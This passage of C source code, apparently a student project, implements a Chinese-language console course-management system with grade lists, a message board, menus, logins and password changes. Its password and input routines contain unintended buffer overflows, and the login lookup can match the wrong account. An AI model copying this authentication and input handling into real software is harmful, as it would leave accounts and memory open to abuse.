n作为判断数\r\n\t\t}\r\n\t\tp1=p1-&gt;next;\r\n\t}\r\n\tif(n==0)\r\n\t\tprintf(\"\\n无该班级信息\");\r\n   getchar(); getchar();\r\n\r\n}\r\n\r\nvoid skim_list_stu(struct tec * p)  //教师查看所有选自己课的学生\r\n{\r\n   struct cla *p3;\r\n   struct order *p11,*p1,*head;\r\n   struct res *p2;\r\n   int z;\r\n   p1=list(p-&gt;cla);\r\n   head=p1;\r\n   system(\"cls\");\r\n   while(p1!=NULL)\r\n   {\r\n\t   p3=p1-&gt;pointer;\r\n       printf(\"\\n---------------------------------------------------------------------\");\r\n       printf(\"\\n学生ID&gt;&gt;学生姓名&gt;&gt;考试成绩&gt;&gt;平时成绩&gt;&gt;综合成绩&gt;&gt;&gt;&gt;重修成绩&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n       printf(\"\\n---------------------------------------------------------------------\");\r\n\t   printf(\"\\n%d  %s    %.2f \\t %.2f \\t %.2f \\t\",p3-&gt;id,p3-&gt;stu_name,p3-&gt;e_score,p3-&gt;n_score,p3-&gt;t_score);\r\n\t   if(p3-&gt;res!=NULL)\r\n\t\t{\r\n\t\t   p2=p3-&gt;res;\r\n\t\t   z=1;\r\n\t\t   while(p2!=NULL)\r\n\t\t   {\r\n\t\t \tprintf(\"(%d)%.2f  \",z++,p2-&gt;score);\r\n\t \t    p2=p2-&gt;next;\r\n\t\t   }\r\n}\r\n\r\n\r\n\t\telse\r\n\t\tprintf(\"无重修\");\r\n\r\n       p1=p1-&gt;next;\r\n   }\r\n   p1=head;\r\n   while(p1!=NULL)\r\n   {\r\n      p11=p1;\r\n\t  p1=p1-&gt;next;\r\n\t  free(p11);\r\n   }\r\n   getchar(); getchar();\r\n\r\n}\r\n\r\nstruct order * list(struct cla *head)// 学生分数排序 返回链表头   to make a list of stu\r\n{\r\n    struct order *p1=NULL,*p2,*p3,*p4;\r\n\tstruct cla *p;\r\n\tp=head;\r\n\twhile(p!=NULL)\r\n\t{\r\n\t   if(p1==NULL)//the head\r\n\t   {\r\n\t     p2=(struct order*)malloc(sizeof(struct order));\r\n\t\t p2-&gt;pointer=p;\r\n\t\t p2-&gt;next=NULL;\r\n\t\t p1=p2;\r\n\t   }\r\n\t   else\r\n\t   {\r\n\t      if(p-&gt;e_score&gt;p1-&gt;pointer-&gt;e_score)\r\n\t\t  {\r\n\t\t     p2=(struct order*)malloc(sizeof(struct order));\r\n\t    \t p2-&gt;pointer=p;\r\n\t\t\t p2-&gt;next=p1;\r\n\t    \t p1=p2;\r\n\t\t  }\r\n\t\t  else\r\n\t\t  {\r\n\t\t     p3=p1;\r\n\t\t     while(p3!=NULL)\r\n\t\t\t {\r\n\t\t\t     if(p-&gt;e_score&gt;p3-&gt;pointer-&gt;e_score) break;\r\n\t\t\t    p4=p3; p3=p3-&gt;next;\r\n\t\t\t }\r\n\t\t\t p2=(struct order*)malloc(sizeof(struct order));\r\n\t         p2-&gt;pointer=p;\r\n\t\t\t if(p3==NULL) p2-&gt;next=NULL;\r\n\t\t\t else  p2-&gt;next=p3;\r\n\t         p4-&gt;next=p2;\r\n\r\n \t\t  }\r\n\t   }\r\n\t   p=p-&gt;tec;\r\n\t}\r\n\treturn p1;\r\n}\r\n\r\nvoid  print_stu(struct stu* p1)  //输出学生\r\n{\r\n   struct cla *p2;\r\n   struct res *p3;\r\n   printf(\"\\n------------------------------------------------------------\");\r\n\t\t\tprintf(\"\\nID\\t&gt;&gt;名字&gt;&gt;&gt;性别&gt;年龄&gt;宿舍&gt;&gt;&gt;&gt;手机号码&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n\t\t\tprintf(\"\\n------------------------------------------------------------\");\r\n\t\t\tprintf(\"\\n%d %s  %s   %d   %d    %s\",p1-&gt;id,p1-&gt;name,p1-&gt;sex,p1-&gt;age,p1-&gt;dor,p1-&gt;phone);\r\n\t\t\tif(p1-&gt;cla==NULL)\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\\n暂无选课信息!\");\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tp2=(struct cla*)p1-&gt;cla;\r\n\t\t\t\tprintf(\"\\n------------------------------------------------------------\");\r\n\t\t    \tprintf(\"\\n课程名称&gt;&gt;&gt;学分&gt;&gt;考试成绩&gt;&gt;平时成绩&gt;&gt;综合成绩&gt;&gt;&gt;&gt;\");\r\n\t\t    \tprintf(\"\\n------------------------------------------------------------\");\r\n\t\t\t\twhile(p2!=NULL)\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\\n%-12s  %d   %.2f     %.2f     %.2f     \",p2-&gt;name,p2-&gt;score,p2-&gt;e_score,p2-&gt;n_score,p2-&gt;t_score);\r\n\t\t\t\t\tif(p2-&gt;e_score&lt;60)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t    p2-&gt;t_score=p2-&gt;e_score;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse p2-&gt;t_score=(p2-&gt;e_score+p2-&gt;n_score)*0.5;\r\n\t\t\t\t\tif(p2-&gt;res==NULL)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprintf(\"该课程无重修.\");\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tp3=(struct res *)p2-&gt;res;\r\n\t\t\t\t\t\twhile(p3!=NULL)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tprintf(\"\\n------------------------------------------------------------\");\r\n\t\t            \t\tprintf(\"\\n重修学期&gt;&gt;&gt;分数&gt;&gt;重修次数&gt;&gt;&gt;&gt;\");\r\n\t\t             \t\tprintf(\"\\n------------------------------------------------------------\");\r\n\t\t            \t\tprintf(\"\\n%d      %.2f    %d\",p3-&gt;semester,p3-&gt;score,p3-&gt;times);\r\n\t\t\t\t\t\t\tp3=p3-&gt;next;\r\n\t\t\t\t\t\t}\r\n\r\n\t\t\t\t\t}\r\n\t\t\t\t\tp2=p2-&gt;next;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\tgetchar();getchar();\r\n}\r\n\r\nstruct info2 *Rfile2(struct info2 *head_note)\r\n {\r\n     FILE *fr,*fw;\r\n     char note[500];\r\n     char name[20];\r\n     char reply[500];\r\n     char ch;\r\n     int i,replied=0;\r\n     struct info2 *p2,*p1;\r\n     fr=fopen(\"note.txt\",\"r\");\r\n     if(fr==NULL)\r\n     {\r\n        fw=fopen(\"note.txt\",\"w\");\r\n        fr=fopen(\"note.txt\",\"r\");\r\n    }\r\n    while((ch=fgetc(fr))!=EOF)\r\n    {\r\n        fseek(fr,-1,SEEK_CUR);\r\n        p1=(struct info2*)malloc(sizeof(struct info2));\r\n        fscanf(fr,\"%d%s%s\\n\",&amp;i,name,note);\r\n        p1-&gt;i=i;\r\n        strcpy(p1-&gt;name,name);\r\n        strcpy(p1-&gt;note,note);\r\n        p1-&gt;next=NULL;\r\n        if(head_note==NULL) head_note=p1;\r\n        else p2-&gt;next=p1;\r\n        p2=p1;\r\n    }\r\n    return head_note;\r\n\r\n }\r\n\r\nvoid Savenote(struct info2 *head_note)\r\n{\r\n    struct info2 *sp1=head_note;\r\n    FILE *fps;\r\n    fps=fopen(\"note.txt\",\"w\");\r\n    if(fps==NULL)\r\n        printf(\"\\t\\t\\t\\t\\n保存失败！\\n\");\r\n    while(sp1)\r\n    {\r\n        fprintf(fps,\"%d %s %s\\n\",sp1-&gt;i,sp1-&gt;name,sp1-&gt;note);\r\n        sp1=sp1-&gt;next;\r\n    }\r\n    printf(\"\\t\\t\\t\\t\\n保存成功！\\n\\n\");\r\n\r\n}\r\n\r\nstruct info2 *First2(struct info2 *head_note)\r\n{\r\n\r\n    struct info2 *p;\r\n    char name[20]; //使用者名称\r\n    char note[500]; //用途\r\n    printf(\" \\t\\t\\t\\t请输入你的姓名：\\n\");\r\n    scanf(\"%s\",name);\r\n    printf(\" \\t\\t\\t\\t请输入你的留言：\\n\");\r\n    scanf(\"%s\",note);\r\n    p=(struct info2*)malloc(sizeof(struct info2));\r\n    strcpy(p-&gt;name,name);\r\n    p-&gt;i=1;\r\n    strcpy(p-&gt;note,note);\r\n    p-&gt;next=NULL;\r\n    head_note=p;\r\n    Savenote(head_note);\r\n    return head_note;\r\n}\r\n\r\nvoid watchall(struct info2 *head_note)\r\n{\r\n    struct info2 *np1=head_note;\r\n        if(np1==NULL)\r\n    {\r\n        printf(\"  \\n\\t\\t\\t\\t没有留言信息！\\n\");\r\n    }\r\n    while(np1)\r\n    {\r\n        printf(\"  \\n  \\t\\t\\t\\t[%d] %s: %s\\n\\n\",np1-&gt;i,np1-&gt;name,np1-&gt;note);\r\n        np1=np1-&gt;next;\r\n    }\r\n    printf(\"  \\n  \\t\\t\\t\\t以上是全部留言！\\n\");\r\n}\r\n\r\nstruct info2 *leavenote(struct info2 *head_note)\r\n{\r\n    struct info2 *p,*p1,*p2;\r\n    char note[500];\r\n    char name[20];\r\n    int i=1;\r\n    p2=head_note;\r\n    while(p2)\r\n    {\r\n        p1=p2;\r\n        p2=p2-&gt;next;\r\n        i++;\r\n    }\r\n    printf(\"\\n\\t\\t\\t\\t请输入你的姓名：\");\r\n    scanf(\"%s\",name);\r\n    printf(\"\\n\\t\\t\\t\\t请输入你的留言：\");\r\n    scanf(\"%s\",note);\r\n    p=(struct info2*)malloc(sizeof(struct info2));\r\n    p-&gt;i=i;\r\n    strcpy(p-&gt;note,note);\r\n    strcpy(p-&gt;name,name);\r\n    p1-&gt;next=p;\r\n    p-&gt;next=NULL;\r\n    Savenote(head_note);\r\n}\r\n\r\nstruct info2 *notesys(struct info2 *head_note)\r\n{\r\n    int flag=1;\r\n    struct info2 *np1;\r\n    np1=head_note;\r\n    int choice=0;\r\n    system(\"cls\");\r\n    while(flag)\r\n        {\r\n        printf(\"\\t\\t\\t\\t    ┏━━━━━━━━┳━━━━━━━━┓\\n\");\r\n        printf(\"\\t\\t\\t\\t    ┃[1]查看全部信息 ┃[2]留言         ┃\\n\");\r\n        printf(\"\\t\\t\\t\\t    ┣━━━━━━━━╋━━━━━━━━┫\\n\");\r\n        printf(\"\\t\\t\\t\\t    ┃          [0]退出留言系统         ┃\\n\");\r\n        printf(\"\\t\\t\\t\\t    ┗━━━━━━━━┻━━━━━━━━┛\\n\\n\");\r\n        printf(\"\\t\\t\\t\\t    请输入操作编号：\");\r\n        scanf(\"%d\",&amp;choice);\r\n         switch(choice)\r\n        {\r\n\r\n        case 1:\r\n            watchall(head_note);\r\n            break;\r\n        case 2:\r\n            {\r\n            if(head_note==NULL)\r\n                    head_note=First2(head_note);\r\n            else\r\n            leavenote(head_note);\r\n            break;\r\n            }\r\n        case 0:\r\n            flag=0;\r\n            break;\r\n        default:\r\n            printf(\"\\n\\t\\t\\t\\t┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\\n\");\r\n            printf(\"\\n\\t\\t\\t\\t┃请输入正确编号！┃\\n\");\r\n            printf(\"\\n\\t\\t\\t\\t┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\\n\");\r\n            break;\r\n        }\r\n    }\r\n}\r\n\r\nvoid stu_ui(struct stu *p)//学生界面\r\n{\r\n     int z;\r\n\t system(\"cls\");\r\n\t struct info2 *head_note=NULL;\r\n\t head_note=Rfile2(head_note);\r\n\t do\r\n\t {\r\n\r\n        printf(\"\\n\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+        %s,欢迎你          |\\n\",p-&gt;name);\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+    [1]----修改个人信息       |\\n\");\r\n        printf(\"\\t\\t\\t+    [2]----选 课              |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [3]----查询课程信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [4]----修改密码           |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [5]----留言               |\\n\");\r\n        printf(\"\\t\\t\\t+    [0]----返回主界面         |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"请输入您的选择：\");\r\n        scanf(\"%d\", &amp;z);\r\n        switch(z)\r\n        {\r\n        case 0 :break;\r\n        case 1 :modify_stu(p);break;\r\n        case 2 :select_s(p);break;\r\n        case 3 :print_stu(p);break;\r\n        case 4 :st_key_stu(p);break;\r\n        case 5 :notesys(head_note);break;\r\n\t\tdefault:printf(\"\\n无效选项!\");\r\n        }\r\n\t }while(z!=0);\r\n}\r\n\r\nvoid tec_ui(struct tec *p)//教师界面\r\n{\r\n     int z;\r\n\t system(\"cls\");\r\n\t do\r\n\t {\r\n        printf(\"\\n\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+       %s,欢迎您。         |\\n\",p-&gt;name);\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+    [1]----修改个人信息       |\\n\");\r\n        printf(\"\\t\\t\\t+    [2]----登记学生分数       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [3]----查看所有学生       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [4]----按学号查看学生     |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [5]----修改密码           |\\n\");\r\n        printf(\"\\t\\t\\t+    [0]----返回主界面         |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"请输入您的选择：\");\r\n        scanf(\"%d\", &amp;z);\r\n        switch(z)\r\n        {\r\n        case 0 :    break;\r\n        case 1 :modify_tec(p);break;\r\n        case 2 :tec_score(p);break;\r\n        case 3 :skim_list_stu(p);break;\r\n\t\tcase 4 :stu_score(p); break;\r\n \t\tcase 5 :st_key_tec(p); break;\r\n\t\tdefault:printf(\"\\n无效选项!\");\r\n        }\r\n\t }while(z!=0);\r\n}\r\n\r\nvoid adm_ui_1()//管理员界面1\r\n{\r\n     int z;\r\n\t system(\"cls\");\r\n\t \tdo\r\n\t{\r\n        printf(\"\\n\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+            管理员            |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+    [1]----录入学生信息       |\\n\");\r\n        printf(\"\\t\\t\\t+    [2]----录入教师信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [3]----录入选课信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [4]----录入重修信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [5]----查询学生信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [6]----查询教师信息       |\\n\");\r\n        printf(\"\\t\\t\\t+    [7]----删除学生信息       |\\n\");\r\n        printf(\"\\t\\t\\t+    [8]----删除教师信息       |\\n\");\r\n        printf(\"\\t\\t\\t+    [9]----下一页             |\\n\");\r\n        printf(\"\\t\\t\\t+    [0]----退出系统           |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"请输入您的选择：\");\r\n        scanf(\"%d\", &amp;z);\r\n        switch(z)\r\n        {\r\n        case 0 :    break;\r\n        case 1 :input_stu();break;\r\n        case 2 :input_tec();break;\r\n        case 3 :input_cla();break;\r\n        case 4 :input_res(); break;\r\n        case 5 :skim_stu(head);  break;\r\n\t\tcase 6 :skim_tec(head_tec); break;\r\n\t\tcase 7 :del_stu();  break;\r\n\t\tcase 8 :del_tec();break;\r\n\t\tcase 9 :adm_ui_2();break;\r\n\t\tdefault:printf(\"\\n无效选项!\");\r\n        }\r\n\t}\r\n    while(z!=0);\r\n}\r\n\r\nvoid adm_ui_2()//管理员界面2\r\n{\r\n     int z;\r\n\t system(\"cls\");\r\n     \tdo\r\n\t{\r\n        printf(\"\\n\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+            管理员            |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+    [1]----删除重修信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [2]----修改学生信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [3]----修改教师信息       |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [4]----按课程查看学生     |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [5]----按班统计学生       |\\n\");\r\n        printf(\"\\t\\t\\t+    [6]----统计所有学生信息   |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [7]----统计所有教师信息   |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [8]----管理员密码修改     |\\n\");\r\n        printf(\"\\t\\t\\t+    [0]---- 上一页            |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"请输入您的选择：\");\r\n        scanf(\"%d\", &amp;z);\r\n        switch(z)\r\n        {\r\n        case 0 :    break;\r\n        case 1 :del_res();break;\r\n        case 2 :modify_stu_adm();  break;\r\n        case 3 :modify_tec_adm();  break;\r\n        case 4 :skim_stu_course();  break;\r\n\t\tcase 5 :skim_stu_class(); break;\r\n\t\tcase 6 :skim_stu_all();  break;\r\n\t\tcase 7 :skim_tec_all();break;\r\n\t\tcase 8 :adm_key();break;\r\n\t\tdefault:printf(\"\\n无效选项!\");\r\n        }\r\n\t}\r\n    while(z!=0);\r\n}\r\n\r\nvoid key_stu()//学生ID与密码验证\r\n{\r\n     int z=0;\r\n     z&lt;=2;\r\n\t char key1[11];\r\n\t int id;\r\n\t struct stu *p;\r\n\t do\r\n\t {\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|*************学生登录*************|&amp;|\");\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|----------------------------------|&amp;|\");\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|         .--.                     |&amp;|\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|        /.-. '--------------.     |&amp;|\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|        \\\\'-' .--''--'' -''-'      |&amp;|\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|         '--'                     |&amp;|\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|----------------------------------|&amp;|\");\r\n\t\t printf(\"\\n请输入学生ID(8位数字):\");\r\n         scanf(\"%d\",&amp;id);\tfflush(stdin);\r\n         printf(\"\\n请输入密码(10位以内):\");\r\n\t     key(key1);fflush(stdin);\r\n\t\t p=head;\r\n\t\t while(p!=NULL)\r\n\t\t {\r\n\t\t     if(p-&gt;id&gt;=id) break;\r\n\t\t     p=p-&gt;next;\r\n\t\t }\r\n\t\t if(p!=NULL)\r\n\t\t {\r\n\t\t     if(strcmp(p-&gt;key,key1)==0)\r\n\t\t\t {\r\n\t\t\t      stu_ui(p);  break;\r\n\t\t\t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t    z++;\r\n\t\t\t    printf(\"\\n账号或密码有误，请重新输入(你还有%d次机会)：\",2-z);\r\n                printf(\"\\n请输入密码(10位以内):\");\r\n\t            key(key1);fflush(stdin);\r\n\t            if(strcmp(p-&gt;key,key1)==0)\r\n\t\t\t    {\r\n\t\t\t      stu_ui(p);  break;\r\n\t\t\t    }\r\n\t\t\t }\r\n\t\t }\r\n\t\t else\r\n\t\t {\r\n\t\t\t printf(\"该生不存在。\"); break;\r\n\t\t }\r\n\t }while(z!=2);\r\n}\r\n\r\nvoid key_tec()//教师ID与密码验证\r\n{\r\n     int z=0;\r\n     z&lt;=2;\r\n\t char key1[11];\r\n\t int id;\r\n\t struct tec *p;\r\n\t system(\"cls\");\r\n\t do\r\n\t {\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|*************教师登录*************|&amp;|\\t\");\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|----------------------------------|&amp;|\\t\");\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|         .--.                     |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|        /.-. '--------------.     |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|        \\\\'-' .--''--'' -''-'      |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|         '--'                     |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|----------------------------------|&amp;|\\t\");\r\n         printf(\"\\n请输入教师ID(8位数字):\");\r\n         scanf(\"%d\",&amp;id);\t fflush(stdin);\r\n         printf(\"\\n请输入密码(10位以内):\");\r\n\t     key(key1);fflush(stdin);\r\n\t\t p=head_tec;\r\n\t\t while(p!=NULL)\r\n\t\t {\r\n\t\t     if(p-&gt;id&gt;=id) break;\r\n\t\t     p=p-&gt;next;\r\n\t\t }\r\n\t\t if(p!=NULL)\r\n\t\t {\r\n\t\t     if(strcmp(p-&gt;key,key1)==0)\r\n\t\t\t {\r\n\t\t\t      tec_ui(p);  break;\r\n\t\t\t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t    z++;\r\n\t\t\t    printf(\"\\n账号或密码有误，请重新输入(你还有%d次机会)：\",2-z);\r\n\t\t\t    printf(\"\\n请输入密码(10位以内):\");\r\n\t            key(key1);fflush(stdin);\r\n\t            if(strcmp(p-&gt;key,key1)==0)\r\n\t\t\t    {\r\n\t\t\t      tec_ui(p);  break;\r\n                }\r\n\t\t\t }\r\n\t\t }\r\n\t\t else\r\n\t\t {\r\n\t\t     printf(\"\\n对不起，该ID不存在，请查证后再输入。\");\r\n\t\t     break;\r\n         }\r\n\t }while(z!=2);\r\n}\r\n\r\nvoid key_adm()//管理员密码验证 只要密码\r\n{\r\n    int z=0;\r\n\tchar key1[11];\r\n\tsystem(\"cls\");\r\n\tdo\r\n\t{\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|*************管理员登录***********|&amp;|\\t\");\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|----------------------------------|&amp;|\\t\");\r\n\t     printf(\"\\n\\t\\t\\t|&amp;|         .--.                     |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|        /.-. '--------------.     |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|        \\'-' .--''--'' -''-'      |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|         '--'                     |&amp;|\\t\");\r\n         printf(\"\\n\\t\\t\\t|&amp;|----------------------------------|&amp;|\\t\");\r\n         printf(\"\\n请输入密码（10位以内）:\");\r\n\t     key(key1);\r\n\t\t if(strcmp(in1.key,key1)==0||strcmp(in2.key,key1)==0)\r\n\t\t {\r\n\t\t     adm_ui_1();  break;\r\n\t\t }\r\n\t\t else\r\n\t\t {\r\n\t\t     z++;\r\n\t\t     printf(\"\\n密码错误请重新输入(你还有%d次机会)：\",2-z);\r\n\t\t }\r\n\t}while(z!=2);\r\n}\r\n\r\nvoid st_key_stu(struct stu *p)//学生密码修改\r\n{\r\n     char key1[11],key2[11];\r\n\t int z=1;\r\n\t system(\"cls\");\r\n\t do\r\n\t {\r\n\t     printf(\"\\n请输入新密码:\");\r\n\t     key(key1);  fflush(stdin);\r\n\t     printf(\"\\n请再次输入新密码:\");\r\n\t     key(key2);  fflush(stdin);\r\n\t     if(strcmp(key1,key2)==0)\r\n\t     {\r\n\t         strcpy(p-&gt;key,key1); printf(\"\\n密码修改成功!\");break;\r\n\t     }\r\n\t\t else\r\n\t\t {\r\n\t\t     printf(\"\\n两次密码不一致，请重新输入,不再修改请输入0,继续修改请输入任何其余值.\");\r\n\t\t\t scanf(\"%d\",&amp;z); fflush(stdin);\r\n\t\t }\r\n\t }while(z!=0);\r\n\r\n\r\n}\r\n\r\nvoid st_key_tec(struct tec *p)// 教师密码修改\r\n{\r\n     char key1[11],key2[11];\r\n\t int z=1;\r\n\t system(\"cls\");\r\n\t do\r\n\t {\r\n\t     printf(\"\\n请输入新密码:\");\r\n\t     key(key1);  fflush(stdin);\r\n\t     printf(\"\\n请再次输入新密码:\");\r\n\t     key(key2);  fflush(stdin);\r\n\t     if(strcmp(key1,key2)==0)\r\n\t     {\r\n\t         strcpy(p-&gt;key,key1); printf(\"\\n密码修改成功!\"); break;\r\n\t     }\r\n\t\t else\r\n\t\t {\r\n\t\t     printf(\"\\n两次密码不一致，请重新输入,不再修改请输入0,继续修改请输入任何其余值.\");\r\n\t\t\t scanf(\"%d\",&amp;z); fflush(stdin);\r\n\t\t }\r\n\t }while(z!=0);\r\n\r\n\r\n}\r\n\r\nvoid adm_key()//管理员密码修改\r\n{\r\n     int z=0;\r\n\t char key0[11],key1[11],key2[11];\r\n\t system(\"cls\");\r\n\t do\r\n\t {\r\n\t     printf(\"\\n请输入原密码（10位以内）:\");\r\n\t     key(key0);  fflush(stdin);\r\n\t\t if(strcmp(in1.key,key0)==0||strcmp(in2.key,key0)==0)\r\n\t\t {\r\n\t\t      break;\r\n\t\t }\r\n\t\t else\r\n\t\t {\r\n\t\t     z++;\r\n\t\t     printf(\"\\n密码错误请重新输入(你还有%d次机会).\",5-z);\r\n\t\t }\r\n\t }while(z!=5);\r\n\t if(z!=5)\r\n\t {\r\n\t\t  do\r\n\t {\r\n\t     printf(\"\\n请输入新密码:\");\r\n\t     key(key1);  fflush(stdin);\r\n\t     printf(\"\\n请再次输入新密码:\");\r\n\t     key(key2);  fflush(stdin);\r\n\t     if(strcmp(key1,key2)==0)\r\n\t     {\r\n\t         strcpy(in1.key,key1); break;\r\n\t     }\r\n\t\t else\r\n\t\t {\r\n\t\t     printf(\"\\n两次密码不一致，请重新输入,不再修改请输入0,继续修改请输入1.\");\r\n\t\t\t scanf(\"%d\",&amp;z);\r\n\t\t }\r\n\t }while(z!=0);\r\n\r\n\t }else exit(0);\r\n\r\n}\r\n\r\nvoid key(char *key)//以星号形式接受密码并放到地址key上\r\n{\r\n\r\nint i=0,j=0;\r\n\r\nchar c;\r\n\r\nfor(;;)\r\n\r\n{\r\n\tc=getch();\r\n\r\n    if(j==0)\r\n\t{\r\n\t\tif((int)c==13)\r\n\t\t{\r\n\t\t\tprintf(\"\\n哦，不，你必须输入密码，这是规则！\");\r\n\t\t\tprintf(\"\\n请输入密码：\");\r\n\t\t}\r\n\t\telse if((int)c==8) *key='\\0';\r\n\t\telse\r\n\t\t{\r\n\t\t\tj=1;*key=c;key++;i++;\r\n\t\t\tprintf(\"*\");\r\n\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\tif(i&gt;=29 &amp;&amp; (int)c!=13 &amp;&amp; (int)c != 8 )\r\n\t\t{\r\n\t\t\t*key='\\0';\r\n\t\t}\r\n\t\telse if((int)c==8)\r\n\t\t{\r\n\t\t\tif(i&gt;0)\r\n\t\t\t{\r\n\t\t\ti--;\r\n\t\t\tkey--;\r\n\t\t\t*key='\\0';\r\n\t\t\tprintf(\"\\b\");printf(\" \");printf(\"\\b\");\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tj=0;\r\n\t\t\t\t*key='\\0';\r\n\t\t\t}\r\n\t\t}\r\n\t\telse if((int)c==13)\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t*key=c;\r\n\t\t\tkey ++;\r\n\t\t\ti++;\r\n\t\t\tprintf(\"*\");\r\n\t\t}\r\n\t}\r\n}\r\n*key='\\0';\r\n\r\nprintf(\"\\n\");\r\n\r\n}\r\n\r\nvoid stu_score(struct tec * p) //教师查看学生分数 按id\r\n{\r\n\tstruct cla *p1;\r\n\tstruct res *p2;\r\n\tint id;\r\n\tint z=1;\r\n\tsystem(\"cls\");\r\n\r\n\t    printf(\"\\n请输入学生ID:\");\r\n       \tscanf(\"%d\",&amp;id);fflush(stdin);\r\n\tdo\r\n\t{\r\n\t\tp1=p-&gt;cla;\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t     if(p1-&gt;id==id) break;\r\n\t     p1=p1-&gt;tec;\r\n\t}\r\n\tif(p1!=NULL)\r\n\t{\r\n\t    printf(\"\\n---------------------------------------------------------------------\");\r\n    \tprintf(\"\\n学生ID&gt;&gt;&gt;&gt;学生姓名&gt;&gt;考试成绩&gt;&gt;&gt;&gt;平时成绩&gt;&gt;&gt;&gt;综合成绩&gt;&gt;&gt;&gt;重修成绩&gt;&gt;&gt;&gt;&gt;&gt;\");\r\n    \tprintf(\"\\n---------------------------------------------------------------------\");\r\n    \tprintf(\"\\n%d  %s   %.2f \\t %.2f \\t %.2f \\t %.2f \\t\",p1-&gt;id,p1-&gt;stu_name,p1-&gt;e_score,p1-&gt;n_score,p1-&gt;t_score);\r\n\t\tp2=p1-&gt;res;\r\n\t\twhile(p2!=NULL)\r\n\t\t{\r\n\t\t     printf(\"(%d)%d  \",p2-&gt;times,p2-&gt;score);\r\n\t\t     p2=p2-&gt;next;\r\n\t\t}\r\n\t\tz=0;\r\n\t\tgetchar();\r\n\t}\r\n\telse\r\n\t{\r\n\t     printf(\"\\n找不到该学生!请重新输入ID(或者输入0结束查询):\");\r\n\t\t scanf(\"%d\",&amp;id);\r\n\t}\r\n\r\n\t}while(id!=0&amp;&amp;z!=0);\r\n\r\n\r\n}\r\n\r\nvoid tec_score(struct tec * head)  //give score to someone 教师给分\r\n{\r\n    struct cla *p;\r\n\tint id;\r\n\tp=head-&gt;cla;\r\n\tsystem(\"cls\");\r\n\tif(p==NULL)\r\n\t{\r\n\t    printf(\"\\n还没有学生选择你的课程。\");\r\n\t}\r\n\telse\r\n\t{\r\n        skim_list_stu(head);\r\n\t    do\r\n\t\t{\r\n\t\t     printf(\"\\n请输入学生的ID:\");\r\n\t\t\t scanf(\"%d\",&amp;id);\r\n\t\t   